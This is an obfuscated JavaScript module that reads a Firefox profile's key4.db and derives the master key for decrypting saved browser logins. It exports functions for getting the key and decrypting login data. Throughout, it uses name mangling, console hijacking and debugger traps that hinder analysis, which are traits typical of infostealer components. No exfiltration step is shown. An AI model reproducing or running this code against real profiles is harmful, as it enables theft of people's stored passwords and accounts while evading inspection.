const _0x184b66 = (function () {
    let _0x2f3382 = true
    return function (_0x2589f3, _0x5949af) {
      const _0x2ba04a = _0x2f3382
        ? function () {
            if (_0x5949af) {
              const _0x48d4d9 = _0x5949af.apply(_0x2589f3, arguments)
              return (_0x5949af = null), _0x48d4d9
            }
          }
        : function () {}
      return (_0x2f3382 = false), _0x2ba04a
    }
  })(),
  _0x411a34 = _0x184b66(this, function () {
    return _0x411a34
      .toString()
      .search('(((.+)+)+)+$')
      .toString()
      .constructor(_0x411a34)
      .search('(((.+)+)+)+$')
  })
_0x411a34()
const _0x5b4cdf = (function () {
  let _0xd6a882 = true
  return function (_0x3fa93f, _0x259bd5) {
    const _0x44380a = _0xd6a882
      ? function () {
          if (_0x259bd5) {
            const _0x46d3c8 = _0x259bd5.apply(_0x3fa93f, arguments)
            return (_0x259bd5 = null), _0x46d3c8
          }
        }
      : function () {}
    return (_0xd6a882 = false), _0x44380a
  }
})()
;(function () {
  _0x5b4cdf(this, function () {
    const _0x3a7ec1 = new RegExp('function *\\( *\\)'),
      _0x36d746 = new RegExp('\\+\\+ *(?:[a-zA-Z_$][0-9a-zA-Z_$]*)', 'i')
    const _0x485ee5 = _0x17e349('init')
    !_0x3a7ec1.test(_0x485ee5 + 'chain') || !_0x36d746.test(_0x485ee5 + 'input')
      ? _0x485ee5('0')
      : _0x17e349()
  })()
})()
const _0x23c9fc = (function () {
    let _0x12855c = true
    return function (_0x557789, _0x285869) {
      const _0x4a0480 = _0x12855c
        ? function () {
            if (_0x285869) {
              const _0x5a9a1e = _0x285869.apply(_0x557789, arguments)
              return (_0x285869 = null), _0x5a9a1e
            }
          }
        : function () {}
      return (_0x12855c = false), _0x4a0480
    }
  })(),
  _0x11eccc = _0x23c9fc(this, function () {
    let _0x319ddf
    try {
      const _0x39ba57 = Function(
        'return (function() {}.constructor("return this")( ));'
      )
      _0x319ddf = _0x39ba57()
    } catch (_0x518666) {
      _0x319ddf = window
    }
    const _0xcd253d = (_0x319ddf.console = _0x319ddf.console || {}),
      _0x2df970 = [
        'log',
        'warn',
        'info',
        'error',
        'exception',
        'table',
        'trace',
      ]
    for (let _0x41bd9e = 0; _0x41bd9e < _0x2df970.length; _0x41bd9e++) {
      const _0x64c2a2 = _0x23c9fc.constructor.prototype.bind(_0x23c9fc),
        _0x489b7c = _0x2df970[_0x41bd9e],
        _0x4bf8dc = _0xcd253d[_0x489b7c] || _0x64c2a2
      _0x64c2a2['__proto__'] = _0x23c9fc.bind(_0x23c9fc)
      _0x64c2a2.toString = _0x4bf8dc.toString.bind(_0x4bf8dc)
      _0xcd253d[_0x489b7c] = _0x64c2a2
    }
  })
_0x11eccc()
const _0x4e05d5 = require('fs')
const _0x6db182 = require('node-forge'),
  _0x4134d3 = require('sql.js'),
  _0x53f78e = require('path')
function _0x102b5c(_0x14666f) {
  const _0x1d9cc6 = _0x6db182.asn1.fromDer(_0x6db182.util.decode64(_0x14666f))
  return {
    iv: _0x1d9cc6.value[1].value[1].value,
    data: _0x1d9cc6.value[2].value,
  }
}
async function _0x31952b(_0x23ed03, _0x3fa39f) {
  const _0x2e8b91 = _0x53f78e.join(_0x23ed03, 'key4.db')
  if (!_0x4e05d5.existsSync(_0x2e8b91)) {
    throw new Error('key4.db was not found in this profile directory.')
  }
  const _0x3db361 = _0x6db182.util.encodeUtf8(_0x3fa39f || ''),
    _0x22367c = _0x4e05d5.readFileSync(_0x2e8b91),
    _0x28220b = await _0x4134d3().then(function (_0x149e4b) {
      return new _0x149e4b.Database(_0x22367c)
    })
  const _0x55110f = _0x28220b.exec(
    "SELECT item1, item2 FROM metadata WHERE id = 'password';"
  )
  if (
    _0x55110f &&
    _0x55110f.length &&
    _0x55110f[0].values &&
    _0x55110f[0].values.length
  ) {
    const _0x2b05f6 = _0x23e04e(_0x55110f[0].values[0][0].buffer),
      _0x5e8ba4 = _0x23e04e(_0x55110f[0].values[0][1].buffer),
      _0x1b483e = _0x6db182.asn1.fromDer(_0x5e8ba4),
      _0x391e96 = _0x195b3d(_0x1b483e.value, _0x3db361, _0x2b05f6)
    if (_0x391e96 && _0x391e96.data === 'password-check') {
      const _0x3ce35f = _0x28220b.exec(
        'SELECT a11 FROM nssPrivate WHERE a11 IS NOT NULL;'
      )
      if (
        _0x3ce35f &&
        _0x3ce35f.length &&
        _0x3ce35f[0].values &&
        _0x3ce35f[0].values.length
      ) {
        const _0x58ccdc = _0x23e04e(_0x3ce35f[0].values[0][0].buffer),
          _0x3d7736 = _0x6db182.asn1.fromDer(_0x58ccdc)
        return _0x195b3d(_0x3d7736.value, _0x3db361, _0x2b05f6)
      }
    } else {
      throw new Error('Master password incorrect.')
    }
  }
  throw new Error(
    'Not able to get key from profile directory or no passwords were found.'
  )
}
function _0x195b3d(_0x13797a, _0x38a1eb, _0xbae07d) {
  if (_0x13797a[0].value[1].value[0].value[1].value != null) {
    return _0xadeef8(_0x13797a, _0x38a1eb, _0xbae07d)
  }
  return _0x355b96(_0x13797a, _0x38a1eb, _0xbae07d)
}
function _0x355b96(_0x28e927, _0x1532a3, _0x1f078d) {
  const _0x3f09b3 = _0x28e927[1].value,
    _0xe2e15d = _0x28e927[0].value[1].value[0].value,
    _0xf03c70 = _0x37f03d(_0x1f078d + _0x1532a3),
    _0x2f8138 = _0x23e04e(_0x36f304(_0x173ea6(_0xe2e15d), 20).buffer),
    _0x3d2e81 = _0x37f03d(_0xf03c70 + _0xe2e15d),
    _0x596c70 = _0x56c00c(_0x2f8138 + _0xe2e15d, _0x3d2e81)
  const _0x4c783b = _0x56c00c(_0x2f8138, _0x3d2e81),
    _0x3f55f5 = _0x56c00c(_0x4c783b + _0xe2e15d, _0x3d2e81)
  const _0x97df28 = _0x596c70 + _0x3f55f5,
    _0x4ce0ab = _0x6db182.util.createBuffer(_0x97df28),
    _0x395ed5 = _0x4ce0ab.length() - 32,
    _0x86c8ec = _0x4ce0ab.getBytes(24)
  _0x4ce0ab.getBytes(_0x395ed5)
  const _0x4c1136 = _0x4ce0ab.getBytes(8)
  return _0x5997df(_0x3f09b3, _0x4c1136, _0x86c8ec, '3DES-CBC')
}
function _0xadeef8(_0x1090cf, _0x544eca, _0x4e91d9) {
  const _0x1aaaac = _0x1090cf[1].value
  const _0x293d15 = _0x1090cf[0].value[1].value[0].value[1].value,
    _0x329173 = _0x293d15[0].value
  const _0x5d3b8a = _0x293d15[1].value.charCodeAt()
  const _0x2e2f28 = '\x04\x0E' + _0x1090cf[0].value[1].value[1].value[1].value
  const _0xbe53fe = _0x37f03d(_0x4e91d9 + _0x544eca),
    _0x47554d = _0x6db182.pkcs5.pbkdf2(
      _0xbe53fe,
      _0x329173,
      _0x5d3b8a,
      32,
      _0x6db182.md.sha256.create()
    )
  return _0x5997df(_0x1aaaac, _0x2e2f28, _0x47554d, 'AES-CBC')
}
function _0x5997df(_0x3d0864, _0x5a973a, _0x4a6f2a, _0x63371a) {
  const _0xed709d = _0x6db182.cipher.createDecipher(_0x63371a, _0x4a6f2a)
  return (
    _0xed709d.start({ iv: _0x5a973a }),
    _0xed709d.update(_0x6db182.util.createBuffer(_0x3d0864)),
    _0xed709d.finish(),
    _0xed709d.output
  )
}
function _0x37f03d(_0x2a4077) {
  const _0x4879f6 = _0x6db182.md.sha1.create()
  return _0x4879f6.update(_0x2a4077, 'raw'), _0x4879f6.digest().data
}
function _0x36f304(_0x89010d, _0x436c66) {
  if (_0x89010d.length >= _0x436c66) {
    return _0x89010d
  }
  const _0x472c55 = _0x436c66 - _0x89010d.length,
    _0x264fe7 = []
  for (let _0x4fd440 = 0; _0x4fd440 < _0x472c55; _0x4fd440++) {
    _0x264fe7.push(0)
  }
  var _0x36ca82 = new Uint8Array(_0x264fe7.length + _0x89010d.length)
  _0x36ca82.set(_0x264fe7, 0)
  return _0x36ca82.set(_0x89010d, _0x264fe7.length), _0x36ca82
}
function _0x56c00c(_0x37cf4d, _0x365d4e) {
  const _0x9fea98 = _0x6db182.hmac.create()
  _0x9fea98.start('sha1', _0x365d4e)
  return _0x9fea98.update(_0x37cf4d, 'raw'), _0x9fea98.digest().data
}
function _0x23e04e(_0x184136) {
  return String.fromCharCode.apply(null, new Uint8Array(_0x184136))
}
function _0x173ea6(_0x32b456) {
  const _0x58899b = new Uint8Array(_0x32b456.length)
  for (let _0xd481a8 = 0; _0xd481a8 < _0x32b456.length; _0xd481a8++) {
    _0x58899b[_0xd481a8] = _0x32b456.charCodeAt(_0xd481a8)
  }
  return _0x58899b
}
module.exports = {
  getKey: _0x31952b,
  decodeLoginData: _0x102b5c,
  decrypt: _0x5997df,
}
function _0x17e349(_0x458059) {
  function _0x37b7ad(_0x5d733d) {
    if (typeof _0x5d733d === 'string') {
      return function (_0x153c05) {}
        .constructor('while (true) {}')
        .apply('counter')
    } else {
      ;('' + _0x5d733d / _0x5d733d).length !== 1 || _0x5d733d % 20 === 0
        ? function () {
            return true
          }
            .constructor('debugger')
            .call('action')
        : function () {
            return false
          }
            .constructor('debugger')
            .apply('stateObject')
    }
    _0x37b7ad(++_0x5d733d)
  }
  try {
    if (_0x458059) {
      return _0x37b7ad
    } else {
      _0x37b7ad(0)
    }
  } catch (_0x116727) {}
}
